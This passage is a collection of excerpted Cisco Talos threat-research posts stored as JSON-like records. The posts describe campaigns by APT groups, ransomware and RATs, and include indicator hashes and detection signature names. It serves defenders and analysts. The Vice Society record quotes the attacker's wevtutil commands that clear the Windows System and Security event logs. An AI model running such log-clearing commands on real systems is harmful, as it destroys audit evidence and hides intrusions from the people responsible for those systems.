Sysmon's event ID 6. \nIn summary, while Windows security has improved, maintaining vigilance against kernel mode threats requires adoption of best practices and monitoring techniques to protect against known and unknown driver vulnerabilities. ", "source": "Cisco"}, {"title": "Introduction", "content": "In Talos, we are continuously trying to improve our research and threat intelligence capabilities. As a consequence, we not only leverage standard tools for analysis, but we also focus our efforts on innovation, developing our own technology to overcome new challenges. Also, Talos has traditionally supported open-source projects, and has open-sourced many different projects and tools that are currently used as part of our workflow like FIRST and BASS. \nIn this blogpost we present PyREBox, our Python scriptable Reverse Engineering sandbox. PyREBox is based on QEMU, and its goal is to aid reverse engineering by providing dynamic analysis and debugging capabilities from a different perspective. PyREBox allows to inspect a running QEMU VM, modify its memory or registers, and to instrument its execution with simple Python scripts. QEMU (when working as a whole-system-emulator) emulates a complete system (CPU, memory, devices...). By using Virtual Machine Introspection (VMI) techniques, it does not require to perform any modification into the guest operating system, as it transparently retrieves information from its memory at run-time. \nSeveral academic projects such as DECAF, PANDA, S2E, or AVATAR, have previously leveraged QEMU based instrumentation for reverse engineering tasks. These projects allow to write plugins in C/C++, and implement several advanced features such as dynamic taint analysis, symbolic execution, or even record and replay of execution traces. With PyREBox, we aim to apply this technology focusing on keeping the design simple, and on the usability of the system for threat analysts. ", "source": "Cisco"}, {"title": "Conclusion", "content": "We believe that PyREBox can be a useful tool for reverse engineering. Its integration with Python and Volatility allows countless applications, from malware or exploit/vulnerability analysis, to firmware analysis (in the future, we plan to support other architectures and operating systems). It can be easily integrated with many security tools that are already implemented in Python. The design of this framework makes trivial to create a new set of shell commands to interface with any python library: it would be a matter of writing a simple wrapper script. \nWe are open-sourcing this internally developed tool because we believe it can be valuable for the community, and invite researchers to contribute with new scripts that can unleash the full potential of PyREBox. \nSHARE THIS POST ", "source": "Cisco"}, {"title": "Introduction", "content": "CyCon U.S. is a premier conference on cyber conflict. It provides a venue for fresh ideas, relevant and actionable content, insight into future trends, and access to industry, government, and military leaders, cyber innovators, and pioneers in the discipline. The conference promotes multidisciplinary cyber initiatives and furthers research and cooperation on cyber threats and opportunities. \nCyCon U.S. is a collaborative effort between the Army Cyber Institute at the United States Military Academy and the NATO Cooperative Cyber Defence Centre of Excellence. CyCon U.S. complements the CyCon Conference held every spring in Estonia. The conference is also technically co-sponsored by IEEE Commputer Society. ", "source": "Cisco"}, {"title": "Introduction", "content": "https://blog.talosintelligence.com/cyber-conflict-decoy-document/ \nCisco Talos discovered a new malicious campaign from the well known actor Group 74 (aka Tsar Team, Sofacy, APT28, Fancy Bear...). Ironically the decoy document is a deceptive flyer relating to the Cyber Conflict U.S. conference. CyCon US is a collaborative effort between the Army Cyber Institute at the United States Military Academy and the NATO Cooperative Cyber Military Academy and the NATO Cooperative Cyber Defence Centre of Excellence. Due to the nature of this document, we assume that this campaign targets people with an interest in cyber security. Unlike previous campaigns from this actor, the flyer does not contain an Office exploit or a 0-day, it simply contains a malicious Visual Basic for Applications (VBA) macro. The VBA drops and executes a new variant of Seduploader. This reconnaissance malware has been used by Group 74 for years and it is composed of 2 files: a dropper and a payload. The dropper and the payload are quite similar to the previous versions but the author modified some public information such as MUTEX name, obfuscation keys... We assume that these modifications were performed to avoid detection based on public IOCs. \nThe article describes the malicious document and the Seduploader reconnaissance malware, especially the difference with the previous versions. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Analysis of this campaign shows us once more that attackers are creative and use the news to compromise the targets. This campaign has most likely been created to allow the targeting of people linked to or interested by cybersecurity, so probably the people who are more sensitive to cybersecurity threats. In this case, Group 74 did not use an exploit or any 0-day but simply used scripting language embedded within the Microsoft Office document. Due to this change, the fundamental compromise mechanism is different as the payload is executed in a standalone mode. The reasons for this are unknown, but, we could suggest that they did not want to utilize any exploits to ensure they remained viable for any other operations. Actors will often not use exploits due to the fact that researchers can find and eventually patch these which renders the actors weaponized platforms defunct. Additionally the author did some small updates after publications from the security community, again this is common for actors of this sophisticated nature, once their campaigns have been exposed they will often try to change tooling to ensure better avoidance. For example the actor changed the XOR key and the MUTEX name. We assume that these modifications were performed in order to avoid detection based on public IOCs. \nCoverage \nAdditional ways our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. \nCWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such asNGFW,NGIPS, andMeraki MX can detect malicious activity associated with this threat. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIOCs ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin \nFRIDAY, MAY 12, 2017 09:58 \nRANSOMWARE \nThis post was written by Nick Biasini, Edmund Brumaghin and Warren Mercer with contributions from Colin Grady \nSummary https://blog.talosintelligence.com/jaff-ransomware/ \nTalos is constantly monitoring the email threat landscape and tracking both new threats as well as changes to existing threats. We recently observed several large scale email campaigns that were attempting to distribute a new variant of ransomware that has been dubbed \"Jaff\". Interestingly we identified several characteristics that we have previously observed being used during Dridex and Locky campaigns. In a short period of time, we observed multiple campaigns featuring high volumes of malicious spam emails being distributed, each using a PDF attachment with an embedded Microsoft Word document functioning as the initial downloader for the Jaff ransomware. While Cisco customers were already automatically protected against this threat, we decided to take a deeper look at this threat and its possible implications across the threat landscape. We have outlined the infection process and additional relevant information regarding this threat in detail below. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This is yet another example of a new ransomware variant being unleashed on the world. This occurrence is becoming far too common and shows why this is such an attractive avenue for miscreants. There are millions of dollars at stake and everyone is trying to grab a piece of the pie. Jaff is being distributed through a common mechanism, Necurs based spam. However, it is asking for a fairly large ransom of \\$3700. The question is at which price point does it deter users from paying. In the future we will likely see adversaries continue to try and find the sweet spot, maximizing profits without sacrificing ransoms paid. \nIn today's threat landscape ransomware dominates and is being pushed onto systems around the world in every way possible. With the large scale decrease in exploit kit activity its likely going to continue to be heavily distributed through email as well as being delivered as a secondary payload when adversaries manage to penetrate a network or system, in the case of threats like Samsam. \nCoverage \nAdditional ways our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. \nCWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nThe Network Security protection of IPS and NGFW have up-to-date signatures to detect malicious network activity by threat actors. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella prevents DNS resolution of the domains associated with malicious activity. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra, Kendall McKay \nTUESDAY, MARCH 29, 2022 08:01 \nTHREAT SPOTLIGHT RAT\nCisco Talos has observed a new Transparent Tribe campaign targeting Indian government and military entities. While the actors are infecting victims with CrimsonRAT, their well-known   \nmalware of choice, they are also using new stagers and implants.   \nThis campaign, which has been ongoing since at least June 2021, uses fake domains mimicking legitimate government and related organizations to deliver malicious payloads, a   \ncommon Transparent tribe tactic. Based on our analysis of Transparent Tribe operations over the last year, the group has continued to change its initial entry mechanisms and incorporate new bespoke malware,   \nindicating the actors are actively diversifying their portfolio to compromise even more   \nvictims.   \nNotably, the adversary has moved towards deploying small, bespoke stagers and downloaders that can be easily modified, likely to enable quick and agile operations. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Transparent Tribe has been a highly active APT group in the Indian subcontinent. Their primary targets have been government and military personnel in Afghanistan and India. This campaign furthers this targeting and their central goal of establishing long term access for espionage. The use of multiple types of delivery vehicles and file formats indicates that the group is aggressively trying to infect their targets with their implants such as CrimsonRAT. They have continued the use of fake domains masquerading as government and quasi-government entities, as well as the use of generically themed content-hosting domains to host malware. Although not very sophisticated, this is an extremely motivated and persistent adversary that constantly evolves tactics to infect their targets. \nOrganizations should remain vigilant against such threats, as they are likely to proliferate in the future. In-depth defense strategies based on a risk analysis approach can deliver the best results in the prevention. However, this should always be complemented by a good incident response plan which has been not only tested with tabletop exercises and reviewed and improved every time it's put to the test on real engagements. \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nSnort SIDs: 59222-59223 \nThe following ClamAV signatures available for protection against this threat: \nVbs.Downloader.Agent-9940743-0   \nWin.Downloader.TransparentTribe-9940744-0   \nWin.Trojan.MargulasRAT-9940745-0   \nWin.Downloader.Agent-9940746-0   \nWin.Trojan.MSILAgent-9940762-1   \nWin.Trojan.PythonAgent-9940791-0   \nLnk.Trojan.Agent-9940793-0   \nWin.Trojan.TransparentTribe-9940795-0   \nWin.Trojan.TransparentTribe-9940801-0   \nWin.Downloader.TransparentTribe-9940802-0 ", "source": "Cisco"}, {"title": "Introduction", "content": "By Craig Williams \nTUESDAY, OCTOBER 28, 2014 11:10 \nTHREATS \nThis post was authored by Andrea Allievi, Douglas Goddard, Shaun Hurley, and Alain Zidouemba. \nRecently, there was a blog post on the takedown of a botnet used by threat actor group known as Group 72 and their involvement in Operation SMN.  This group is sophisticated, well funded, and exclusively targets high profile organizations with high value intellectual property in the manufacturing, industrial, aerospace, defense, and media sector. The primary attack vectors are watering-hole, spear phishing, and other web-based attacks. \nFrequently, a remote administration tool (RAT) is used to maintain persistence within a victim's organization. These tools are used to further compromise the organization by attacking other hosts inside the targets network. \nZxShell (aka Sensocode) is a Remote Administration Tool (RAT) used by Group 72 to conduct cyber-espionage operations. Once the RAT is installed on the host it will be used to administer the client, exfiltrate data, or leverage the client as a pivot to attack an organization's internal infrastructure.  Here is a short list of the types of tools included with ZxShell: \nKeylogger (used to capture passwords and other interesting data) Command line shell for remote administration   \nRemote desktop   \nVarious network attack tools used to fingerprint and compromise other hosts on the network   \nLocal user account creation tools For a complete list of tools please see the MainConnectionIo section. \nThe following paper is a technical analysis on the functionality of ZxShell. The analysts involved were able to identify command and control (C2) servers, dropper and installation methods, means of persistence, and identify the attack tools that are core to the RAT's purpose. In addition, the researchers used their analysis to provide detection coverage for Snort, Fireamp, and ClamAV. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Advanced persistent threats will remain a problem for companies and organizations of all sizes, especially those with high financial or intellectual property value.  Group 72's involvement in Operation SMN is another example of what sort of damage that can be done if organizations are not diligent in their efforts to secure their networks.  ZxShell is one sample amongst several tools that Group 72 used within their campaign. \nZxShell is a sophisticated tool employed by Group 72 that contains all kinds of functionality.  Its detection and removal can be difficult due to the various techniques used to conceal its presence, such as disabling the host anti-virus, masking its installation on a system with a valid service name, and by masking outbound traffic as originating from a web browser. While other techniques are also utilized to conceal and inhibit its removal, ZxShell's primary functionality is to act as a Remote Administration Tool (RAT), allowing the threat actor to have continuous backdoor access on to the compromised machine. \nAs our analysis demonstrates, ZxShell is an effective tool that can be ultimately used to steal user credentials and other highly valuable information. The threat posed by ZxShell to organizations is one that cannot be ignored.  Organizations with high financial or intellectual property value should take the time to ensure their security requirements are met and that employee's are educated about the security threats their organizations face. \nFor additional information, please see our blog post. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra, Jungsoo An \nWEDNESDAY, NOVEMBER 10, 2021 17:11\nTHREATS \nCisco Talos has observed a new malware campaign operated by the Kimsuky APT group since June 2021.   \nKimsuky, also known as Thallium and Black Banshee, is a North Korean state-sponsored advanced persistent threat (APT) group active since 2012.   \nThis campaign utilizes malicious blogs hosted on Blogspot to deliver three types of preliminary malicious content: beacons, file exfiltrators and implant deployment scripts.   \nThe implant deployment scripts, in turn, can infect the endpoint with additional implants such as system informationstealers, keyloggers and credential stealers.   \nThese implants are derivatives of the Gold Dragon/Brave Prince family of malware operated by Kimsuky since at least 2017 - now forked into three separate modules.   \nThis campaign targets South Korea-based think tanks whose research focuses on political, diplomatic and military topics pertaining to North Korea, China, Russia and the U.S. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Kimsuky is a highly motivated threat actor targeting a number of entities in South Korea. This group has been relentlessly creating new infection chains to deliver different types of malware to their victims. This campaign relies on the abuse of Blogspot to host attacker-operated blogs serving malicious VB based scripts to their targets. We've found preliminary malicious components from initial access beacons to file exfiltrators being deployed to victims. In many cases, the content of these preliminary components was combined to serve special scripts to victims. \nThe final implants utilized by the actors in this campaign are derivatives of the Gold Dragon/Brave Prince malware families. Since late 2020, the actors have introduced multiple capabilities (and removed some) in the implants eventually modularizing them into three distinct malware. \nApart from stealing research using bespoke file exfiltrators, another goal of the campaign is to gather credentials using trojanized tools such as Nirsoft's WebBrowserPassView and use implants to establish continued unauthorized access into entities of interest. Such targeted attacks can result in the leak of restricted research, unauthorized access for espionage and even destructive attacks against target organizations. \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign.   \nYou can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nThe Snort SIDs for this threat are: 58496-58497. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Craig Williams \nWEDNESDAY, JULY 8, 2015 06:49\nThis post was authored by Nick Biasini \nTalos is constantly observing malicious spam campaigns delivering various different types of payloads. Common payloads include things like Dridex, Upatre, and various versions of Ransomware. One less common payload that Talos analyzes periodically are Remote Access Trojans or RATs. A recently observed spam campaign was using freeware remote access trojan DarkKomet (a.k.a DarkComet). This isn't a novel approach since threat actors have been leveraging tools like DarkKomet or Hawkeye keylogger for quite sometime. \nSome interesting techniques in this campaign were used by the threat actor to bypass simplistic sandbox methods including use of sub folders, right to left override, and excessive process creation. This threat also had surprising longevity and ample variations, used over time, to help ensure the success of the attack. \nWhat is DarkKomet? \ndc_panel_controller \nDarkKomet is a freeware remote access trojan that was released by an independent software developer. It provides the same functionality you would expect from a remote access tool: keylogging, webcam access, microphone access, remote desktop, URL download, program execution, etc. One interesting thing is that it added some other functions you wouldn't expect to try and emphasize it wasn't a malicious tool by including a piano game and \"fun manager\". Below are a couple of images of the panel that the attacker would be utilizing. ", "source": "Cisco"}, {"title": "IOC", "content": "9B06BC6268A1CFD40CE4A9CAF91A4F877CC2A093DC1B4C4F3DFEA6D7A386186BB26D78B1F54875DA5E115C682D2A5A72685BCBA430448D44CBA964F5A4BE0769007C2797E4908D739437D9A7CCD227B64E028E959D2695CB4A8979E9014BBB88D315C041E578FEAA78F04689B0AE3B0243A286522A136862693E8D9463E20FA0C29ADA0830949D2934912EFE36BF262EAD306F03F646DD7FFD6CE61E8521519E08234467F2FA9BF4187BCB0F1F8307E6F6EC79516633B2906FE097F35D91122342479907AB8775BBA8F1757091C03036FE853F5C99A527AEEC29BC9A3C9016310F7F2164F666E794CADBEB70B522215375E5EE14540A7B47A5A337A2E173D401C7E0B2FF121861E78D05E101A81A15D20427DE92EA2773F4480008DFABC92D385D0326EB66DC5012BF0AB1EC60538C02A0C72020B4149E1349937920C6EAB83116EF8F1B73BDEF73667E27123D972B7D73038C47D04FBD62C5A667FCAA1017A2E66386186BB26D78B1F54875DA5E115C682D2A5A72685BCBA430448D44CBA923090F008A08AE0B9B8EF7D1DFADA2A5CA0D2C31BD72158B479613C0ED", "source": "Cisco"}, {"title": "Conclusion", "content": "Threat actors are constantly attempting to deliver something to end users. This is just another example of a different type of tool that has been being delivered over the last six months. By not changing the command and control infrastructure the threat actor has made it easy to track them from one sample to the next. Even with the relative lack of ingenuity here, using a freeware Remote Access Trojan phoning back to the same host, the threat actor did use some clever mechanisms like multiple tiers of folders and RLO to evade basic detection engines and antivirus as well as trying to hide the processes by mimicking existing well known legitimate processes as well as potential sandbox evasion methods. These techniques have helped aid the miscreant to deliver the RAT to unsuspecting users for more than six months. \nThreat actors are always going to try to get access to systems and a layered approach to security is always going to be the best protection. Threat actors commonly target one type of technology, in this case malicious file detection, but will rarely target multiple different types of technologies. This also reinforces the need at an organizational level to evaluate the usage of Dynamic DNS services. If there is not a legitimate business need to allow it, block it. ", "source": "Cisco"}, {"title": "Introduction", "content": "In November 2018, Cisco Talos discovered an attack campaign, called DNSpionage, in which threat actors created a new remote administrative tool that supports HTTP and DNS communication with the attackers' command and control(C2). Since then, there have been several other public reports of additional DNSpionage attacks, and in January, the U.S. Department of Homeland Security issued an alert warning users about this threat activity. \nIn addition to increased reports of threat activity, we have also discovered new evidence that the threat actors behind the DNSpionage campaign continue to change their tactics, likely in an attempt to improve the efficacy of their operations. In February, we discovered some changes to the actors' tactics, techniques and procedures (TTPs), including the use of a new reconnaissance phase that selectively chooses which targets to infect with malware. In April 2019, we also discovered the actors using a new malware, which we are calling \"Karkoff.\" \nThis post will cover the aforementioned DNSpionage updates, the discovery of the Karkoff malware and an analysis of the recent Oilrig malware toolset leak - and how it could be connected to these two attacks. ", "source": "Cisco"}, {"title": "Conclusion", "content": "The threat actor's ongoing development of DNSpionage malware shows that the attacker continues to find new ways to avoid detection. The oddities we mentioned are certainly not normal, but the payload was clearly updated to attempt to remain more elusive. DNS tunneling is a popular method of exfiltration for some actors and recent examples of DNSpionage show that we must ensure DNS is monitored as closely as an organization's normal proxy or weblogs. DNS is essentially the phonebook of the internet, and when it is tampered with, it becomes difficult for anyone to discern whether what they are seeing online is legitimate. The discovery of Karkoff also shows the actor is pivoting and is increasingly attempting to avoid detection while remaining very focused on the Middle Eastern region. Cisco Talos will continue to monitor for activity from this actor and ensure our protection and detection capabilities continue to prevent such advanced attacks on our customers. \nCoverage \nAdditional ways our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. Below is a screenshot showing how AMP can protect customers from this threat. \nCisco Cloud Web Security (CWS) orWeb Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such asNext-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nOpen Source SNORT\u24c7 Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIndicators of Compromise (IOCs) \nThe following IOCs are associated to this campaign: \nDNSpionage XLS document ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin, Joe Marshall, Arnaud Zobec \nTHURSDAY, AUGUST 12, 2021 18:33 \nExecutive Summary \nAnother threat actor is actively exploiting the so-called PrintNightmarevulnerability (CVE-2021- 1675 / CVE-2021-34527) in Windows' print spooler service to spread laterally across a victim's https://blog.talosintelligence.com/vice-society-ransomware-printnightmare/ network as part of a recent ransomware attack, according to Cisco Talos Incident Response research. While previous research found that other threat actors had been exploiting this vulnerability, this appears to be new for the threat actor Vice Society. \nTalos Incident Response's research demonstrates that multiple, distinct threat actors view this vulnerability as attractive to use during their attacks and may indicate that this vulnerability will continue to see more widespread adoption and incorporation by various adversaries moving forward. For defenders, it is important to understand the attack lifecycle leading up to the deployment of ransomware. If users have not already, they should download the latest patch for PrintNightmare from Microsoft. \nIn this post, we'll analyze the various TTPs used in a recent ransomware attack from Vice Society that leveraged this vulnerability. Many of these same TTPs are commonly observed in other ransomware attacks, such as a previously published analysis of a WastedLocker attack. \nWho is Vice Society? \nVice Society is a relatively new player in the ransomware space. They emerged in mid-2021 and have been observed launching big-game hunting and double-extortion attacks, primarily targeting small or midsize victims. \nThis group also has notably targeted public school districts and other educational institutions. As they are a new actor in this space, Vice Society's TTPs are difficult to quantify. However, based on incident response observations, they are quick to leverage new vulnerabilities for lateral movement and persistence on a victim's network. They also attempt to be innovative on endpoint detection response bypasses. \nAs with other threat actors operating in the big-game hunting space, Vice Society operates a data leak site, which they use to publish data exfiltrated from victims who do not choose to pay their extortion demands. Below is an example screenshot of this site. ", "source": "Cisco"}, {"title": "defense", "content": "ATT&CK Technique: Indicator Removal on Host: Clear Windows Event Logs (T1070.001) ATT&CK Technique: Modify Registry (T1112) ATT&CK Technique: Impair Defenses or Modify Tools (T1562.001) \nThroughout the attack, the adversary made multiple attempts to evade detection and subvert security controls in place as described throughout previous sections of this blog post. We also observed the attacker attempting to clear the contents of security logs on compromised systems. The following command-line syntax was observed being used to clear the System, Security and Application Windows Event Logs. \nc:\\windows\\system32\\wevtutil.exe cl system c:\\windows\\system32\\wevtutil.exe cl security ", "source": "Cisco"}, {"title": "Conclusion", "content": "As demonstrated throughout this post, attackers often make use of a variety of tactics, techniques, and procedures as they work to accomplish their mission objectives. In some instances, there is significant overlap and similarities between the approaches taken by distinct threat actors. They often leverage dual-use tools for various purposes to minimize their footprint and evade detection. Likewise, adversaries are constantly refining their approach to the ransomware attack lifecycle as they strive to operate more effectively, efficiently, and evasively. \nThe use of the vulnerability known as PrintNightmare shows that adversaries are paying close attention and will quickly incorporate new tools that they find useful for various purposes during their attacks. Multiple distinct threat actors are now taking advantage of PrintNightmare, and this adoption will likely continue to increase as long as it is effective. It is important that defenders be aware of the various TTPs being used throughout the attack lifecycle so that they are prepared to prevent, detect, and respond to nefarious activity that may be indicative of a successful compromise of their environment. Failure to do so could result in widespread operational disruption, reputational damage, and the loss of confidentiality of sensitive information. ", "source": "Cisco"}, {"title": "Introduction", "content": "user@lnx\\$ rtfobj.py file.rtf -s all   \nrtfobj 0.51dev2 - http://decalage.info/python/oletools   \nTHIS IS WORK IN PROGRESS - Check updates regularly!   \nPlease report any issue at https://github.com/decalage2/oletools/issues   \nFile: 'file.rtf' - size: 683341 bytes   \nid |index lOLE Object lOLE Package l00000048h |Not a well-formed 0LE object 0000020Eh |Not a well-formed OLE object   \nSaving raw data in object #0: saving object to file file.rtf_object_00000048.raw   \nSaving raw data in object #1: saving object to file file.rtf_object_0000020E.raw ", "source": "Cisco"}, {"title": "Detection", "content": "Despite the known vulnerability, many security products fail to identify the exploit because they are unable to correctly classify the RTF file format and scan the embedded OLE document within in the RTF. Even open-source parsers such as rtfobj.py from oletools have difficulties extracting the embedded OLE: \nuser@lnx\\$ rtfobj.py file.rtf -s all   \nrtfobj 0.51dev2 - http://decalage.info/python/oletools   \nTHIS IS WORK IN PROGRESS - Check updates regularly!   \nPlease report any issue at https://github.com/decalage2/oletools/issues   \nFile: 'file.rtf' - size: 683341 bytes   \nid |index lOLE object lOLE Package l00000048h |Not a well-formed oLE object 0000020Eh |Not a well-formed 0LE object   \nSaving raw data in object #0: saving object to file file.rtf_object_00000048.raw   \nSaving raw data in object #1: saving object to file file.rtf_object_0000020E.raw \nThis article explains how the malware author modified the RTF file in order to bypass security protection and frustrate malware researchers. \nSpam example   \nThe spam campaign contains different kinds of emails. Many emails consist of a common \"Invoice\" attachment, but some emails are more advanced, as we can see in this example: ", "source": "Cisco"}, {"title": "Conclusion", "content": "This campaign shows that the sophistication and innovation within an attack is not limited to the exploits used. In this case the attackers have used a well known vulnerability, however, this has been combined with a good knowledge of the RTF file format to forge a malicious document designed to avoid detection by security products and maximise the chances that the target will open the document. \nCoverage   \nAdditional ways our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. \nCWS orWSA web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nThe Network Security protection ofIPS andNGFW have up-to-date signatures to detect malicious network activity by threat actors. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella,  our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. ", "source": "Cisco"}, {"title": "Introduction", "content": "In a recent malspam campaign delivering the Qakbot banking trojan, Cisco Talos Incident Response (CTIR) observed the adversary using aggregated, old email threads from multiple organizations that we assess were likely harvested during the 2021 ProxyLogon-related compromises targeting vulnerable Microsoft Exchange servers. \nThis campaign relies on external thread hijacking, whereby the adversary is likely using a bulk aggregation of multiple organizations' harvested emails to launch focused phishing campaigns against previously uncompromised organizations. This differs from the more common approach to thread hijacking, in which attackers use a single compromised organization's emails to deliver their threat. \nThis many-to-one approach is unique from what we have generally observed in the past and is likely an indirect effect of the widespread compromises and exfiltration of large volumes of email from 2020 and 2021. \nUnderstanding the difference between external and single-victim thread hijacking is essential for detecting these threats. Below, we have several tips for defenders on how to identify key indicators of this activity. ", "source": "Cisco"}, {"title": "Conclusion", "content": "By early 2022, the direct effects of ProxyLogon, most famously exploited by the HAFNIUM group, largely quieted down. The external approach to thread hijacking, not necessarily specific to one adversary, appears to be one of the many indirect effects of the widespread compromises that resulted in exfiltration of large volumes of email from 2020 and 2021. Although those emails are relatively old by now, we will likely continue to observe adversaries leveraging bulk email aggregations from multiple organizations to launch focused phishing campaigns. Accurately recognizing the difference between external thread hijacking and victim thread hijacking can potentially avoid incorrect assessment of an incident and save dozens of hours of hunting for an internal breach that does not exist. \nAbusing with style: Leveraging cascading style sheets for evasion and tracking M A R C H 1 3 , 2 0 2 5 0 6 : 0 0 \nCascading Style Sheets (CSS) are ever present in modern day web browsing, however its far from their own use. This blog will detail the ways adversaries use CSS in email campaigns for evasion and tracking. ", "source": "Cisco"}, {"title": "Introduction", "content": "TALOS-2024-1964 (CVE-2024-38184) TALOS-2024-1965 (CVE-2024-38185) TALOS-2024-1966 (CVE-2024-38186) TALOS-2024-1968 (CVE-2024-38062) TALOS-2024-1969 (CVE-2024-38187) TALOS-2024-1970 (CVE-2024-38062) TALOS-2024-1971 (CVE-2024-38062) TALOS-2024-1988 (CVE-2024-38062) \nThis research project was also presented at both HITCON and Hexacon. A recording of the latter's presentation is embedded at the end of this article. ", "source": "Cisco"}, {"title": "Conclusion", "content": "As we have just seen, obfuscated code can hide low hanging fruit, trivial memory corruptions, and simple logic bugs. In the case of ClipSp, this issue is even more serious, as this attack vector may lead to sandbox escapes and potentially significant impact to the compromised user. \nAs such, this is a reminder for security researchers on the value of taking the less traveled path, even if it begins with a bramble of Feistel functions. And for the software engineers and project managers who decide to leverage obfuscation for their projects, this is also a stark reminder that this approach may hinder normal bug finding processes that would detect trivial bugs early on. \nSHARE THIS POST \nRELATED CONTENT \nSmall praise for modern compilers - A case of Ubuntu printing vulnerability that wasn't \nF E B R UA RY 1 0 , 2 0 2 5 0 8 : 3 0 \nDuring an earlier investigation of the macOS printing subsystem, IPP-USB protocol caught our attention.   \nWe decided to take a look at how other operating systems handle the same functionality. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra, Kendall McKay \nTHURSDAY, MAY 13, 2021 08:08\nTHREAT SPOTLIGHT SECUREX\nTransparent Tribe, also known as APT36 and Mythic Leopard, continues to create fake domains mimicking legitimate military and defense organizations as a core component of their operations. Cisco Talos' previous research has mainly linked this group to CrimsonRAT, but new campaigns show they are expanding their Windows malware arsenal with ObliqueRAT. \nWhile military and defense personnel continue to be the group's primary targets, Transparent Tribe is increasingly targeting diplomatic entities, defense contractors, research organizations and conference attendees, indicating that the group is expanding its targeting. \nOur recent research into Transparent Tribe uncovered two types of domains the group uses in their various campaigns: fake domains masquerading as legitimate Indian defense and government-related websites, and malicious domains posing as content-hosting sites. These domains work in conjunction with each other to deliver maldocs distributing CrimsonRAT and ObliqueRAT. \nBased on our findings, Transparent Tribe's tactics, techniques, and procedures (TTPs) have remained largely unchanged since 2020, but the group continues to implement new lures into its operational toolkit. The variety of maldoc lures Transparent Tribe employs indicates the group still relies on social engineering as a core component of its operations. \nHosting infrastructure \nTransparent Tribe uses a two-pronged approach for registering malicious domains: Fake domains masquerading as legitimate sites belonging to government, defense, or research entities, and malicious domains that resemble 